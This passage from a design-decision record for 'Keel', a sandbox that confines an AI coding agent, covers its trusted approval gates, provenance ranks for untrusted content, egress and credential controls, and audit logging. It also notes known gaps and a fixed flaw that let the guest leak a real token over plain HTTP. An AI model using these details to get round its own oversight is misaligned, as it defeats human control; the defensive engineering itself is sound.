| D37 | Floor lifts target the live kernel; persisted floors are evidence, not authority | `floor.json` lives in the untrusted session directory, so editing it cannot raise authority. `keel floor lift` now submits a bounded control frame to the selected live session; the trusted runtime invokes the same kernel state, operator channel, secure-attention gate, and audit chain that authorize subsequent actions. The attached mux also exposes `Ctrl-A /floor-lift [rank]`. Detached or terminal-less sessions refuse the request. A new or continued broker records direct workspace exposure at rank 0 and never imports unsigned floor authority; the shutdown snapshot remains useful for inspection. The 49-line kernel growth is funded by removing the obsolete parallel lift kernel from `keel-input`: budgets become kernel 4,758 and input 2,892, with `13,997 allocated + 3 reserved = 14,000`. |
| D38 | Model ceilings are admitted run authority, not an ambient constant | `keel run` and `keel mux` accept exact per-run token and US-dollar ceilings, defaulting to 1,000,000 tokens and USD 10. The untrusted CLI converts decimal dollars to integer micro-US-dollars without floating point; trusted input independently validates the resulting positive integers. Values no greater than the trusted defaults narrow authority, while raising either ceiling requires foreground task admission that displays both exact limits. The broker receives the admitted values directly and records them in authenticated enforcement state. Existing budget and runtime-sandbox tests move from inline source modules to integration/support tests while retaining coverage, keeping kernel and input below their existing ratchets; `13,997 allocated + 3 reserved = 14,000` and the hard ceiling does not move. |
| D39 | Approval liveness, behavioral denials, and model charges use separate explicit lifecycles | `KEEL-EGRESS-V2` returns a non-authorizing `P` within the five-second machine window only after acquiring the serialized adjudication slot; queued requests have no active decision clock. The relay then permits a bounded human decision: it waits five minutes while the kernel expires the gate at 4 minutes 45 seconds, rejects late input, clears trusted UI state, and returns `D` first. Peer hangup or broker shutdown cancels a still-pending gate; cancellation is checked again around execution and before grant creation, while an effect already in flight cannot be rolled back. Repeated-denial escalation now counts a 15-minute trailing window for one opaque canonical action scope; resource/provider/budget failures do not count, and successful review clears only that scope. Model budget reservations progress from `authorized-unsent` to `send-attempted` and one audited terminal state: only definitely unsent requests are released, complete successful usage settles actuals, and non-success or ambiguous post-send outcomes retain the conservative charge. This cross-cutting security fix did not fit the exhausted 14,000-line cap: measured ratchets are kernel 5,885, policy 852, provenance 914, audit 1,164, secrets 4,140, and input 2,865, or 15,820 allocated lines. The hard ceiling is explicitly reconsidered and raised to 16,000, leaving 180 lines unallocated; no crate receives speculative headroom. |
| D40 | Release-signoff failures are fixed at their owning boundaries | Inspected HTTPS now treats CONNECT and the front-side TLS handshake as local setup only: they perform no DNS or outbound TCP, and the exact decrypted method, path, and body digest are authorized before trusted code resolves or connects. Caller half-close invalidates a pending prompt, rejects late `A`/`G`, and cannot mint a grant. Canonical xterm snapshots reset horizontal, origin, and vertical-margin modes before repainting. Late terminal replies and first-attach races no longer turn a successful short V8 run into `EPIPE`; persistent exit status is preserved, lowercase admission fails nonzero, and `keel stop` requests cooperative runtime shutdown and waits for the terminal audit seal. Bedrock tariff matching accepts reviewed `global.anthropic.*` inference-profile IDs and rejects unsupported pinned models before guest boot. Private Git authentication is limited to the exact repository's receive-pack advertisement and authorized receive-pack POST; private issue reads are authenticated only for the admitted exact repository when the distinct GitHub read credential is loaded. New transport/model lifecycle and persistent-session regressions live under integration/support paths rather than production `src`. The 16,000-line ceiling does not move: `keel-input` receives 113 lines of D39 reserve, moving its ratchet from 2,865 to 2,978; allocations total 15,933 with 67 lines unallocated. |
| D41 | Authenticated private issue reads are distinct from PR authority | `github:read-private-issues` is a closed capability shown at task admission. Credential custody binds it to an exact positive issue number in the admitted exact GitHub repository scope; `pr:create` does not imply reads and reads do not imply writes. The receive-pack advertisement GET is an exact-repository protocol preflight audited as inspected egress, while the receive-pack POST keeps its separate typed push authorization. The hard 16,000-line ceiling is unchanged. After D40 moved regression-only coverage out of production `src`, the measured ratchets are kernel 4,179, policy 852, provenance 914, audit 1,164, secrets 2,805, and input 2,999: 12,913 allocated with 3,087 unallocated. |
| D42 | Reusable grants share the request's origin-liveness and forwarding boundary | A reusable egress grant is owned by the action that created it and remains provisional until trusted transport has an upstream response ready for the still-live origin. Failed terminal-decision delivery, model reservation, DNS/TCP/TLS setup, request forwarding, response acquisition, or origin liveness revokes it. The peer monitor distinguishes queued bytes from readable EOF with a non-consuming peek, so FIN cancels without stealing application data. This guarantee assigns 83 reserve lines to `keel-kernel`, raising its ratchet to 4,262; total allocation is 12,996 with 3,004 lines unallocated under the unchanged 16,000-line ceiling. |
| D43 | Credentials cross only encrypted connections; host acceptance authorizes a policy | Found in review. `CredentialVault::inject` matched server name, method, and path but not transport, and plain-HTTP egress called it, so a guest could send the Git or GitHub sentinel to an admitted host on port 80 and have the real token written in cleartext. Substitution now requires TLS to port 443; the plaintext path only refuses any sentinel. `is_forbidden_ip` now judges IPv4-mapped, IPv4-compatible, NAT64 (`64:ff9b::/96`), and 6to4 addresses by their embedded IPv4 address, and additionally forbids `0/8`, `100.64/10`, `198.18/15`, and `240/4`. Untrusted `keel-gitd` protects `main`, `master`, the workspace HEAD, and `origin/HEAD` as default-branch candidates, because the guest-writable workspace HEAD alone cannot name the remote default, and classifies ref deletion as force. An accepted policy artifact's hash and status are self-asserted, so `keel policy accept` records the hash in a host ledger under the state root and a run refuses an artifact the ledger does not name. Cost: 38 reserve lines to `keel-secrets`, raising its ratchet to 2,843; total allocation is 13,034 with 2,966 unallocated under the unchanged 16,000-line ceiling. |
| D44 | The operator's wait holds only the adjudication slot; an approval covers what it showed | Found in review. Every broker authorization ran `Kernel::process` under the single broker-state mutex, and the trusted gate's human wait (up to 4m45s) happened inside it, so live model streams blocked on send-attempt, response, and reservation bookkeeping while any prompt was open. `process` is now `begin` (structural, loop, policy, rank, budget, grant), a gate decision, and `finish`; the broker releases its state lock between them and holds only a separate gate mutex, which remains the serialized adjudication slot and still gates `P`. Because the session can move during the wait, `finish` re-derives the action's reasons and refuses an approval when any reason was not displayed (`kernel:changed-during-approval`). Reusable `G` grants now bind host, port, and method, waive only the rules the operator saw, and stop applying when the floor falls below its value at approval. Loop detection counts identical actions within a 60-second window instead of across the session, and its rejection is audited. The host V8 proxy requires a per-run credential so other local processes and users cannot use brokered egress, and trusted plaintext forwarding strips that credential. Cost: 312 reserve lines to `keel-kernel` (ratchet 4,574) and 1 to `keel-secrets` (2,844); total allocation is 13,347 with 2,653 unallocated under the unchanged 16,000-line ceiling. |
| D45 | Every action is stamped with its task-envelope verdict; branch scopes narrow push and PR authority | First increment of the action-centric provenance model ([design note](design/guest-confinement-attribution-and-turn-provenance.md)). The kernel computes `IntentVerdict` while stamping and records it as the `intent` audit field for every action, so envelope-based decisions can be measured beside floor-based ones before either changes. The envelope is derived from the closed capabilities plus `push:ref:refs/heads/PATTERN` and `pr:target:BRANCH`. Those two only narrow, so they are enforced immediately as gate-requiring `intent:push-ref` and `intent:pr-target` violations; all other verdicts are shadow. Cost: 155 reserve lines (kernel 110, input 41, provenance 2, audit 2); total allocation is 13,502 with 2,498 unallocated under the unchanged 16,000-line ceiling. |
| D46 | The guest workload is confined a second time inside the VM | Workstream 5 of the [provenance design note](design/guest-confinement-attribution-and-turn-provenance.md). Everything the guest terminal runs is wrapped by `keel-mcp-guest confine`: UID 0 with an empty bounding set, locked `SECBIT_NOROOT`, cleared ambient and capability sets, and `no_new_privs`; Landlock file rules permitting writes only to the workspace and scratch paths; a seccomp filter refusing vsock, packet and raw sockets, namespaces, mounts, `bpf`, `io_uring`, `ptrace`, module loading, and keyrings; and a bounded cgroup. The UID-0 workload is forced by virtiofs presenting the workspace as root-owned. Guest services drop to a separate service UID, and MCP moves to a loopback service relay. A confined child's boot-time self-check is part of the guest report, and the host refuses a guest where any layer fails. The layer is inside the VM boundary and self-reported. Cost: no trusted lines. |
| D47 | Outgoing payloads are judged against the committed repository in shadow | Workstream 2 of the [provenance design note](design/guest-confinement-attribution-and-turn-provenance.md). At admission, trusted code indexes the `HEAD` tree with the hardened host Git as winnowed fingerprints (text blobs private, credential-shaped paths secret; `workspace:public` skips it). The trusted TLS relay shows every decrypted non-model request to the broker through `observe_payload`, which scans target and body after undoing percent and JSON escaping and judges them against the destination's clearance: the GitHub origin may receive private content, the model endpoint anything, other hosts only public content. The `FlowVerdict` is stamped and audited as `flow`; nothing is blocked. Verbatim copies are detected; paraphrase and re-encoding are not. Cost: 435 reserve lines (provenance 269, kernel 131, input 30, secrets 3, audit 2); total allocation is 13,937 with 2,063 unallocated under the unchanged 16,000-line ceiling. |
| D48 | Interrupted model streams are charged an observed bound, and model connections may wait | Found in use. The trusted relay applied a 10-second upstream read timeout to model connections. A large Opus request on Bedrock can exceed that before its first event, and the event stream sends no keepalive, so slow responses failed mid-request and were charged the full conservative reservation. With `max_tokens` of 128,000 that reservation was USD 9.82, and the harness's automatic retries exhausted a USD 10 run on about USD 0.17 of real spend. Model connections now use a ten-minute idle timeout; other upstream connections keep ten seconds. A successful stream that ends early after the provider's opening usage event resolves as `committed-observed`: exact stated input, plus the bytes of text, thinking, and tool input already streamed, plus a 4,096-token margin, capped at the reservation. Failures before that event keep the conservative charge. Cost: 168 reserve lines (secrets 148, kernel 20); total allocation is 14,105 with 1,895 unallocated under the unchanged 16,000-line ceiling. |
| D49 | A model request waits for in-flight reservations, and the default cost ceiling is USD 20 | Found in use. Claude Code sends a small helper request beside its main one. With the main request reserving about USD 9.80 at 128,000 `max_tokens`, the pair exceeded the USD 10 default, so the main request was refused and surfaced as an API error until the helper settled and the harness retried. The broker's request authorizer now waits, outside the state lock, while the request would fit once in-flight reservations settle: it polls every 50 ms for up to 30 seconds, and stops when the origin disconnects. A request that cannot fit even with nothing in flight is not delayed, and the authorization that follows still enforces the ceiling. The default cost ceiling rises from USD 10 to USD 20, so one worst-case Opus request and its helpers fit without admission. Values above the new default still require trusted task admission. Cost: 19 reserve lines in `keel-kernel` (ratchet 4,854); total allocation is 14,124 with 1,876 unallocated under the unchanged 16,000-line ceiling. |
| D50 | Connection-setup legs carry no intent verdict; `keel report --axes` compares the models | A CONNECT or bare TLS leg terminates locally and sends nothing upstream, so its task-envelope verdict is `not-applicable` instead of `egress-host`; the decrypted request inside it is judged separately. The untrusted CLI gains `keel report --axes [SESSION ...]`, which reads only sealed, authenticated chains and compares, per action, whether Keel prompted with what the action-centric decision table would do from the recorded `intent`, `flow`, and violation rules, listing each prompt avoided or added. Budget refusals and pre-verdict actions are excluded. Cost: 7 reserve lines in `keel-kernel` (ratchet 4,861); total allocation is 14,131 with 1,869 unallocated under the unchanged 16,000-line ceiling. |
| D51 | Guest requests carry the process that made them | Workstream 6 of the [provenance design note](design/guest-confinement-attribution-and-turn-provenance.md). PID 1 in the guest becomes a Rust supervisor that keeps root, protected because the kernel delivers no in-namespace signal to PID 1 without a handler. Git and egress relays ask it, per accepted connection, which process owns the client socket (through `/proc/net/tcp` and `/proc/*/fd`) and send its ancestry ahead of the traffic as a `KEEL-ORIGIN-V1` frame, with each ancestor marked when it runs workspace-controlled code. The host forwards the frame; the kernel accepts it before any broker request, stamps it as a guest-reported `ReportedOrigin`, audits it as `origin`, shows it at the gate, and adds `origin:workspace-code` for Git pushes and pull requests from workspace code. The origin only narrows. Cost: 193 reserve lines (kernel 189, audit 4); total allocation is 14,324 with 1,676 unallocated under the unchanged 16,000-line ceiling. |
| D52 | Lines pushed into protected places are traced to the model | Second increment of workstream 2. After every complete, successful model response, trusted code reassembles each tool call's input, including streamed `input_json_delta` fragments, and records the line fingerprints of every string argument: file writes, edits, and shell commands. `keel-gitd` now treats CI configuration (`.github/workflows/`, `.gitlab-ci.yml`, `.circleci/`, and others) as protected alongside manifests. It sends a diff for protected files of any push and for every file of a default-branch push, capped below the kernel bound with a truncation marker. The kernel counts added lines the model never emitted and stamps an `IntegrityVerdict` (`accounted:N`, `unaccounted:U/N`, or `uninspectable`), audited as `integrity` and shown at the gate. It is recorded in shadow, and `keel report --axes` counts unaccounted protected content as a prompt. The diff is still computed by untrusted `keel-gitd`, the same trust the kernel already gives its push flags; kernel-side derivation from the digest-bound pack remains future work. Cost: 243 reserve lines (kernel 113, secrets 88, provenance 38, audit 4); total allocation is 14,567 with 1,433 unallocated under the unchanged 16,000-line ceiling. |
| D53 | The guest kernel moves to 6.12 LTS | Setup downloads Alpine `linux-virt` 6.12 at a pinned version and SHA-256, extracts the raw ARM64 image from the EFI zboot wrapper, and installs the package's modules into the guest image. `keel-mcp-guest confine` adds Landlock ABI 6 scoping of signals and abstract Unix sockets; the boot preflight requires a signal to PID 1 to be refused on ABI 6, and doctor reports the kernel release. Landlock TCP rules stay unhandled: TCP reaches only loopback, and port rules would break local test servers without narrowing egress. Cost: no trusted lines; total allocation stays 14,567 with 1,433 unallocated. |
| D54 | Model context is logged per request, block by block, in shadow | First increment of workstream 4. Trusted `keel-secrets` walks every sanitized model request (`system`, `tools`, and each message's content blocks) and reassembles each complete, successful response's blocks from their streamed deltas. Each block is digested over its identity-bearing fields, excluding cache markers and thinking signatures, so a block the model emitted and the same block carried back share a digest. The kernel writes one `kernel.model-context` audit record per request and per response, bound to the authorizing action: the ordered digest sequence, and place, kind, size, and tool-use identifier only for digests not yet described in the session. The log is best-effort and changes no decision. Untrusted `keel report --context` measures, per session, model-emitted versus unexplained assistant blocks, tool results bound to model tool calls, requests free of tool output, and system-prompt and tool-set variants. Operator-input matching, admitted-blob matching, and turn binding remain future work. Cost: 235 reserve lines (kernel 57, audit 33, secrets 145); total allocation is 14,802 with 1,198 unallocated under the unchanged 16,000-line ceiling. |
| D55 | MCP connections carry the process that opened them | The guest MCP relay runs with `--attribute`, so each MCP connection opens with a `KEEL-ORIGIN-V1` frame from the PID 1 supervisor. The host MCP service reads it before serving MCP and forwards it on every pull-request action and every GitHub API connection behind pull requests and issue reads. The kernel already accepted origins on these requests, so a pull request opened over MCP by workspace code now gains `origin:workspace-code`. Attribution is per connection, not per call. Cost: no trusted lines. |
| D56 | OpenRouter is a third model provider, priced from an admitted snapshot | `--auth openrouter --model PROVIDER/MODEL` routes the Claude harness through OpenRouter's Anthropic-compatible `POST /api/v1/messages`, with the host's `OPENROUTER_API_KEY` injected as a bearer token only on that endpoint. OpenRouter serves many models, so no reviewed table can price them. The untrusted launcher fetches the model's per-provider prices and takes the highest input-side price (prompt and cache writes) and output-side price across every provider endpoint and long-context override, rounded up to whole micro-USD per token. A per-request fee, auto-routing models, and `:online` variants are refused. Trusted admission shows the snapshot and requires the operator to admit it, because an understated price would weaken the budget. The trusted proxy charges only the pinned model at that snapshot and strips OpenRouter's `models`, `route`, `provider`, `plugins`, and `web_search_options` fields, so no request can fall back to another model, provider, or paid plugin. The guest pins every harness model slot to the admitted model. Cost: 83 reserve lines (secrets 66, input 17); total allocation is 14,885 with 1,115 unallocated under the unchanged 16,000-line ceiling. |
| D57 | Every run records a canonical admission manifest before its workload starts | The v1 slice of [run admission](design/run-admission-and-verified-teardown.md#v1-slice-admission-manifest-and-session-status). Trusted `keel-input` builds a manifest of what the run was admitted with: run id and Keel version; SHA-256 of the trusted runtime, runtime backend, VZ backend or V8 runtime, kernel, initramfs, and renderer, plus the kernel release; policy bundle; workspace root, `HEAD`, dirty flag, credential-free origin URL, and Git control digest; capabilities, egress hosts, and credential scopes (never values); model provider, host, region, model, tariff with its source, and ceilings; run shape; and whether trusted input admitted it, with a digest of the exact summary. It is canonical JSON (sorted keys, no whitespace), audited as `kernel.run-admitted` with its SHA-256 immediately after the broker starts and before the runtime backend is spawned; a hashing or write failure refuses the run. Artifact digests are evidence, not enforcement, because the untrusted backend reads the files itself. Untrusted `keel status` now reports `active`, `closed`, or `interrupted` and the manifest summary, and both shadow reports print it per session. The same change sorts object keys before digesting W4 context blocks, because `serde_json`'s `preserve_order` feature is enabled in this dependency graph and a re-serialized tool input would otherwise change its digest. Cost: 249 reserve lines (input 184, secrets 34, kernel 20, audit 11); total allocation is 15,134 with 866 unallocated under the unchanged 16,000-line ceiling. |
| D58 | Triage runs are confined to an analyst-declared scope | Stage 1 of the [triage reproduction profile](design/triage-reproduction.md), trimmed to scope and providers. `keel run`/`keel mux --profile triage` takes `--scope RULE` (`host`, `*.host` for subdomains only, optional `:port`, default 443 and 80), `--exclude RULE` (always wins), `--scope-file FILE` (one rule per line, `!` for exclusions), and `--report FILE`, from whose URLs the untrusted CLI proposes a scope when none is declared. Trusted `keel-provenance` parses rules strictly; trusted admission always requires the operator to admit a triage run and shows the normalized rules; the run's model provider must be on `KEEL_TRIAGE_PROVIDERS` (default `anthropic,bedrock`). In the kernel, in-scope hosts count as admitted egress, and any connection outside scope and the run's admitted hosts is refused structurally as `kernel:out-of-scope`, without a prompt. The manifest records the profile and rules. The declared scope is trusted as the operator's statement; test-credential injection, request limits, enforced report flow, and the browser are later stages. Cost: 176 reserve lines (provenance 98, input 42, kernel 26, secrets 10); total allocation is 15,310 with 690 unallocated under the unchanged 16,000-line ceiling. |
| D59 | The guest has a headless browser | Stage 2 of the triage profile, available in every Claude guest. Alpine 3.23 Chromium 149 and Playwright's MCP server (`@playwright/mcp` 0.0.83, from a committed lockfile) are in the image, registered as the `browser` MCP server. Chromium runs with `--no-sandbox` (DECISIONS D35), QUIC off, and the egress relay as its proxy; the run CA is added to its NSS store at launch. A managed policy and endpoint switches stop its background calls to Google services, so a run sees no browser background traffic. The guest base moves from Alpine 3.20 to 3.23, which brings Node 24 and its `--permission` flag for the V8 harness. Mesa's LLVM and Gallium libraries are removed, the initramfs is compressed with zstd (353 MB), and workspace VMs get 4 GB because the root filesystem unpacks into a tmpfs capped at half of memory. Process attribution counts `node_modules` as workspace code only under a writable root. `keel report --axes` and `--context` also group results by harness, model, provider, and kernel from the admission manifest. Cost: no trusted lines. |
| D60 | The guest browser is driven by agent-browser | `agent-browser` 0.38.2 (vercel-labs), pinned by the npm package and binary checksums, replaces Playwright's MCP server (DECISIONS D36). The agent uses it as the `browser` MCP server and the analyst as a CLI in the guest shell; both share one browser through its daemon. It launches Chromium through `keel-chromium`, which appends Keel's flag file and merges `--disable-features`, because Chromium honors only the last one and agent-browser passes its own. Screenshots, downloads, and HAR files land in a self-ignoring `.keel-browser/` in the workspace, so the analyst sees them on the host at once. WebMCP is off. A live run showed no network actions from the browser or its driver. The interactive browser window is deferred. Cost: no trusted lines. |
| D61 | The guest root filesystem is a read-only disk | The root filesystem ships as a zstd squashfs image (about 390 MB) attached read-only as the first virtio block device, instead of being unpacked from the initramfs into RAM. The initramfs is now stage 1 only (under 1 MB): static busybox, the `virtio_blk`, `squashfs`, and `overlay` modules from the pinned kernel package, and `spikes/phase1-stage1-init.sh`, which mounts the disk under a tmpfs overlay so the root stays writable, moves `/dev` and `/proc` across, and switches to the real `/init`. Guest memory at idle falls from about 1 GB to about 150 MiB, workspace VMs return to 2 GB, and a run boots in about 5 seconds. Trusted `keel-input-runtime` selects the disk beside the initramfs, passes it as `KEEL_ROOTFS`, and records its digest in the admission manifest as `rootfs`; the VZ backend attaches it with `--rootfs`, and doctor checks it. Cost: 5 reserve lines (input 5); total allocation is 15,315 with 685 unallocated under the unchanged 16,000-line ceiling. |
| D62 | The guest can build software | The guest image adds Alpine 3.23's `build-base` (gcc, make), `npm`, `py3-pip`, `rust` and `cargo` 1.91, and `go` 1.25. The root disk grows from about 390 MB to 664 MB, which costs disk, not RAM. Mesa's LLVM library now stays, because `rustc` links against it; only the Gallium drivers are removed. Build tools fetch through Keel's proxy, so the guest launch points npm (`NODE_EXTRA_CA_CERTS`), pip (`PIP_CERT`, `REQUESTS_CA_BUNDLE`), and cargo (`CARGO_HTTP_CAINFO`) at the run CA; Go and Git already read `SSL_CERT_FILE`. `--memory GIB` (default 2, at most 64 and what the host allows) sizes workspace VMs for heavy builds, and the admission manifest records it. Registry hosts still need approval or `--allow egress:HOST`. Cost: 6 reserve lines (input 6); total allocation is 15,321 with 679 unallocated under the unchanged 16,000-line ceiling. |
| D63 | `keel status` reads an unsealed chain's authenticated prefix | The headless end-to-end suite (`ci/e2e.py`) found that `keel status` could never report `interrupted`: it read the chain with the verifier that requires the terminal seal, so an unsealed chain, which is what an active or interrupted session has, failed with "terminal seal missing". `keel-audit` gains `read_verified_prefix`, which returns every authenticated record with its verification status; `keel status` uses it, and only sealed chains count as `closed`. `read_verified_file` still refuses unsealed chains for the reports. Cost: 8 reserve lines (audit 8); total allocation is 15,329 with 671 unallocated under the unchanged 16,000-line ceiling. |
| D64 | CI passes on both platforms | A clean-clone walkthrough ran every CI step locally, with the Linux job in a `rust:1.97.1` container, and found that CI had never been green. The macOS feature build (`--features libkrun-backend,vz-backend`) failed clippy: an unused import, a pass-by-value `Arc`, and two over-long functions (one split, one an untrusted orchestrator allowed). The Linux build failed clippy in code that compiles only there: casts and `map().unwrap_or(false)` in the guest binary, and macOS-only imports and a parameter in the trusted runtime's session code. All are fixed; both platforms now pass fmt, clippy, tests, and doc tests. Cost: 2 reserve lines (input 2: a target-gated import and an attribute); total allocation is 15,331 with 669 unallocated under the unchanged 16,000-line ceiling. |

---

## 6. Provenance (contribution 2, revised)

### 6.1 Ranks

| Rank | Class | Assigned to |
|---|---|---|
| 3 | `trusted_instruction` | Operator keystrokes captured by `keel-input` before entering the guest; structured intent flags (§9.2) |
| 2 | `operator_data` | Files the operator explicitly designated and authenticated signed artifacts |
| 1 | `agent_derived` | Output of a prior attested vertex, at `min(1, writer floor at write time)` |
| 0 | `untrusted_content` | Everything else |

### 6.2 Classification of every result type — the table v0.2 was missing

`keel-provenance` must return a class for every MCP result and every egress response body. No default; an unclassified result type is a startup failure (I8 applies to result types as well as channels).

| Result | Class | Rule |
|---|---|---|
| Workspace file read, regardless of Git author text | 0 | Git author fields are unauthenticated and cannot raise trust. A future admission snapshot may authenticate designated clean-tree blobs. |
| Workspace file read in a configured rank-0 path (`node_modules/`, `vendor/`, `target/`, `.git/`, `dist/`, lockfiles) | 0 | |
| Workspace file read, written by **this** vertex | vertex floor at write time | Write-inheritance (P3). Re-reading own output never lowers the floor below the writer's floor. |
| Shell/test stdout+stderr (`cargo test`, `npm test`, build output) | 0 | Build scripts and proc macros print. Not negotiable. |
| `git status` / `git diff` / `git log` / `git show` | 0 | Repository configuration and author text are attacker-controlled; production classification does not execute Git. |
| MCP result from a backend server the operator marked `trusted` in config | 2 | Explicit opt-in per server. |
| Any other MCP result | 0 | |
| Model API response body (`api.anthropic.com/v1/messages`) | **not classified; does not move the floor** | The model is already untrusted. Server-side tool results are stripped at request time (§8.3), so nothing rides in. |
| Egress response body, any other host | 0 | |
| Harness's own transcript / session files read back | vertex floor at write time | Write-inheritance. |

Consequence to expect: direct workspace, Git, shell, and test output currently
drop the floor to zero. This is intentionally conservative until content can
be bound to an authenticated admission snapshot or per-turn delivery record.

### 6.3 Floor and modes

- Within one live broker, classified observations update `floor = min(floor, rank)`. An explicit gated lift may raise it; later observations may lower it again. Production admission records direct workspace exposure at rank 0.
- **Mode `floor`:** an action whose capability minimum rank exceeds the floor **escalates** (never hard-denies), and the gate shows `floor_history` (§6.4). Approval is per action via a bound token and does **not** lift the floor. Lifting the floor is a separate, explicit operator attestation that also shows `floor_history`.
- **Mode `gate-context`:** no floor check. Every gated action (§7.1) renders `floor_history` at the gate. Provenance is context, not a control.
- Both modes are selected per run (`keel run --provenance floor|gate-context`) and both appear in the eval matrix (§11).

### 6.4 Read-set

`SessionFacts.floor_history : Vec<(rank, SourceRef, ts)>` and `sources_read : Set<SourceRef>` where `SourceRef` is one of `File(path, author)`, `Host(host, path)`, `Mcp(server, tool)`, `Shell(cmd)`. This is what the gate displays: the concrete sources, most recent first, never a summary. Policy may query `sources_read` (e.g., "any `Host` not in `own_domains`").

### 6.5 Resets

- New or continued production broker → 0 from direct workspace exposure.
- Operator attestation → explicit `keel floor lift <session> [rank]` to the live broker, or attached `Ctrl-A /floor-lift [rank]`; gated, shows the read-set, and counted (§7.4).
- Compaction → **no reset**.
- Resume (`--continue`) → harness context may resume, but unsigned floor state is not authorization; the new broker starts at rank 0. Persisted history is inspection evidence only.
- Vertex fork → new vertex boots at 3 with only rank-≥2 inputs mounted; does the privileged step. Phase 3.

---

## 7. Gates and mediation

### 7.1 Capability table (revised)

`min_rank` applies in `floor` mode only. `gate` applies in both modes. Rank shortfall escalates; it never hard-denies.

| Action | min_rank | gate | notes |
|---|---|---|---|
| read workspace, `git status/diff/log`, run tests | 0 | — | |
| write/edit workspace file this vertex created | 0 | — | |
| write/edit workspace file this vertex did not create | 0 | log+alert | stateful rule; escalates on bulk (§9.1) |
| `git commit` | 0 | — | |
| push to non-default branch (via `keel-gitd`) | 0 | log+alert | Reversible (branch delete). Moved from 1 → 0. |
| push touching a manifest/lockfile (`Cargo.toml`, `Cargo.lock`, `package.json`, lockfiles, `go.mod`, `pyproject.toml`, configurable) | 2 | ✅ | This is what "add a dependency" actually is. |
| force-push, push to default branch, PR merge, release publish | 2 | ✅ | |
| send external mail, publish, share a file | 2 | ✅ | |
| egress to a host not on the allowlist | 2 | ✅ | |
| write outside workspace | — | ✅ always | |
| delete outside workspace | — | ✅ always | |
| lift floor | — | ✅ always | |

### 7.2 Approval channel (I9)

- `keel-input` and `keel-kernel` run in the same trusted runtime process. `keel-input` exclusively owns the real tty file descriptor for both reads and writes. Normal keystrokes are classified as `TrustedInput` (rank 3) and forwarded to the guest through the kernel with a stamp.
- The sandboxed `keel-xterm-renderer` receives guest PTY output over framed IPC and returns bounded canonical snapshots plus separately tagged terminal replies; it never receives or opens the real tty. `keel-input` is the sole terminal writer and sends replies only to the untrusted guest. This ownership must be enforced by file-descriptor discipline and the host sandbox, not convention.
- A reserved secure-attention chord is intercepted by `keel-input` and never forwarded to the guest. With an action pending, the chord enters **trusted approval mode**: guest input is paused, complete renderer snapshots are discarded, buffered tty input is flushed, and `keel-input` repaints the terminal itself. On exit it requests one fresh canonical snapshot; no guest terminal delta is replayed through the trusted view.
- The trusted screen renders the exact action, diff, recipient, and `floor_history`, escaping all control characters in untrusted fields. Routine exceptions require a fresh `A` after secure attention. Destructive, irreversible, or authority-changing actions require typing a fresh short challenge followed by Enter. Escape denies. Bracketed-paste input is rejected in this mode, and ordinary keys in normal mode can never approve.
- The decision enters the kernel in-process; there is no approval UDS, second-terminal command, or localhost web endpoint. A future web UI may display pending actions, but may become an approval authority only with a WebAuthn assertion bound to the action target hash.
- Approval is direct synchronous state: the trusted gate receives the exact kernel-owned action and returns one decision to that call. No bearer approval token is minted inside and immediately consumed by the same process.
- A gate is active for at most 4 minutes 45 seconds. Expiry invalidates the pending decision before clearing the trusted prompt and returning denial to the V2 broker; a later `A`, challenge, or command cannot approve the expired action. The untrusted relay's five-minute decision wait is deliberately longer than the kernel deadline.
- A gate shows the thing itself: exact diff, exact command, exact recipient, plus `floor_history`. Never a summary.
- The harness's own auto-permission mode is disabled in the guest image (managed settings, admin tier). It is not a local decision: it asks a server-side classifier over a control-plane endpoint the model credential is not scoped to (§8.3), so it fails closed on every tool call and never reaches a gate. Supporting it would mean widening the endpoint scope and putting a second adjudicator inside the untrusted guest, whose decisions the audit chain cannot speak for. Keel's adjudicator is this channel.
- Claude Code plugin marketplaces are disabled with an empty managed allowlist. Marketplace refreshes are background executable-content fetches, not task authority, and otherwise create unrelated egress prompts at session startup. Keel's explicitly configured MCP bridge is unaffected.

### 7.3 Git mediation (D10)

Do not parse git command lines. Mediate the remote.

- `keel-gitd` (untrusted) serves git smart HTTP on the vsock. The vertex's `origin` is rewritten to it at boot (`git remote set-url` in the guest by the launcher; the guest can change it back, but there is no other route, so it gains nothing).
- On `git-receive-pack`, `keel-gitd` parses the ref update lines (`old-sha new-sha refname`), computes per-ref: `is_default_branch`, `is_force` (old-sha is not an ancestor of new-sha in the kernel-side mirror), `touches_manifest` (diff of new-sha against old-sha filtered by the configured manifest globs), and submits an `Asserted { class: GitPush, target: {refs, flags} }` to the PDP. The kernel stamps and decides. On allow (or approved token), `keel-gitd` pushes to the real remote using a credential it never sees — the push goes through the same egress path with sentinel swap in `keel-secrets`.
- Authorizing a push and completing one are different events, so the push path is two-phase. The allow carries the audit correlation id; after the remote answers, `keel-gitd` reports `completed` or `failed` on a separate broker connection (separate because the kernel handles git requests inline, and the forward's own egress runs while the request stream is still open). The report is audited as `kernel.reported-outcome` with the reporter named, never as an executed `kernel.action` — an untrusted relay's claim is not a kernel observation, and recording it is not a decision, so I6 is untouched. A report is accepted once, only for an id this kernel authorized. Because it is best-effort, the kernel closes every outstanding authorization as `unreported` at shutdown and evicts the oldest beyond a fixed bound; the property does not depend on the relay reporting at all.
- Fetch/clone through `keel-gitd` are read actions; their returned objects are classified per §6.2 (commit authorship).
- GitHub branch protection and a fine-grained token scoped to the target repos remain configured as defence in depth, not as the control.
- The same shape serves PR creation: the vertex calls a `gh_pr_create` MCP tool; the kernel gates it; the relay executes with the real token.
- `gh_issue_read` fetches one normalized repository/issue pair through trusted
  GitHub TLS custody. It is anonymous by default; only a run declaring
  `github:read-private-issues`, whose admitted repository scope names a GitHub
  `owner/repository`, may attach the host-held GitHub token to that repository's
  exact positive issue-number path. `pr:create` remains independent. Keel
  records the API host and exact issue path at rank 0 after the complete
  response arrives and before its structured fields reach the MCP guest.

### 7.4 Gate instrumentation (contribution 7)

From Phase 1, every escalation records: rule, action class, `time_to_decision_ms`, decision, `floor_at_gate`, mode. Reported: escalations/task by rule, decision-time distribution, fraction approved < 2s, approval rate per rule, floor lifts per task.

### 7.5 Enforcement state (D15)

Ten named boundaries, each derived from the object that enforces it rather than from
the configuration that was meant to: the channel registry's own declarations, the
hardcoded protected-state list, the policy's host and capability sets, the live
connector (*asked* whether it denies `169.254.169.254:80` and whether it holds a CA,
not assumed to), the gate's declared authority, the budget's ceilings, the kernel's
provenance mode, and the audit sink's durability. A report assembled from intent is
the failure this record exists to catch, so it must have no second source to drift
from — that is what the drift test asserts, field by field.

Written into the existing chain as `kernel.enforcement-state` at run start, before
the first connection is accepted, and again at shutdown after unreported pushes are
